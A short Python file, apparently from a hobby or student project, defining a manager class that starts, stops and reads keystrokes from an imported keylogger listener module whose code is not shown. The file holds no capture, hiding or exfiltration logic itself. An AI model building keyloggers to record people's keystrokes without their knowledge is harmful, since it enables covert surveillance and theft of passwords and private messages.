from modules.key_logger_service import MyListener

class KeyLogerManeger():
    def __init__(self):
        self.x = MyListener()

    def start(self):  
        self.x.start()  
    
    def stop(self):
        self.x.stop()

    def get_keys(self):
        self.keys = self.x.get_to_keys()
        pass